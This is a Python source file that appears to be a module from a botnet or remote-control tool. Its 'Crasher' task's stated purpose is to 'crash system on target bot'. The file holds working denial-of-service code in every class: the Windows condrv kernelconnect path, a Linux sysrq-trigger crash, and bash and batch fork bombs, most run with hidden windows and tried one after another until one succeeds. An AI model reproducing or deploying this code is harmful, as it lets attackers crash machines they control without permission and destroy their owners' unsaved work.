from tasks.__task import Task


class MethodKernelconnect:
    platforms = ["win32"]
    administrator = {"win32": False}

    def __init__(self):
        super(MethodKernelconnect, self).__init__()

    def run(self):
        from subprocess import run, CREATE_NO_WINDOW
        cmd = run(["\\\\.\\globalroot\\device\\condrv\\kernelconnect"], shell=True, capture_output=True,
                  creationflags=CREATE_NO_WINDOW, start_new_session=True)
        if cmd.returncode:
            raise Exception(cmd.stdout + cmd.stderr)
        else:
            return "Crashed using Kernelconnect method."


class MethodSysrqTrigger:
    platforms = ["linux"]
    administrator = {"linux": True}

    def __init__(self):
        super(MethodSysrqTrigger, self).__init__()

    def run(self):
        from subprocess import run, CREATE_NO_WINDOW
        cmd = run(["echo", "c", ">", "/proc/sysrq-trigger"], shell=True, capture_output=True,
                  creationflags=CREATE_NO_WINDOW, start_new_session=True)
        if cmd.returncode:
            raise Exception(cmd.stdout + cmd.stderr)
        else:
            return "Crashed using SysrqTrigger method."


class MethodLinuxForkBomb:
    platforms = ["linux", "darwin"]
    administrator = {"linux": False, "darwin": False}

    def __init__(self):
        super(MethodLinuxForkBomb, self).__init__()

    def run(self):
        from subprocess import run, CREATE_NO_WINDOW, DETACHED_PROCESS
        cmd = run([":(){ :|:& };:"], shell=True, start_new_session=True)
        if cmd.returncode:
            raise Exception(cmd.stdout + cmd.stderr)
        else:
            return "Crashed using LinuxForkBomb method."


class MethodWindowsForkBomb:
    platforms = ["win32", "linux", "darwin"]
    administrator = {"win32": False, "linux": False, "darwin": False}

    def __init__(self):
        super(MethodWindowsForkBomb, self).__init__()

    def run(self):
        from subprocess import Popen, CREATE_NO_WINDOW
        cmd = Popen(["echo", "^%^0", "^|", "^%^0", ">", "null.bat", "&", "start", "null.bat"],
                    shell=True, start_new_session=True, creationflags=CREATE_NO_WINDOW)
        if cmd.returncode:
            raise Exception(cmd.stdout + cmd.stderr)
        else:
            return "Crashed using WindowsForkBomb method."


class Crasher(Task):
    """Crash system on target bot."""
    platforms = ["win32"]
    description = __doc__
    administrator = {"win32": False}

    def __init__(self, task_id):
        super(Crasher, self).__init__(task_id)
        import logging

        self._logger = logging.getLogger(self.__class__.__name__)
        self.methods = [MethodKernelconnect, MethodSysrqTrigger, MethodLinuxForkBomb,
                        MethodWindowsForkBomb]

    def run(self, **kwargs):
        from sys import platform
        from infos import administrator
        failed = []
        admin = administrator()
        for method in self.methods:
            if any(x.startswith(platform) for x in method.platforms):
                if not admin and method.administrator.get(platform):
                    continue
                try:
                    return method().run()
                except Exception as e:
                    failed.append("Method {} failed: {}".format(method.__name__, e))
        if failed:
            raise Exception("Could not crash bot. All methods failed: {}".format(failed))
        else:
            raise Exception("No available method for this bot. Platform: {}, admin rights: {}".format(platform, admin))
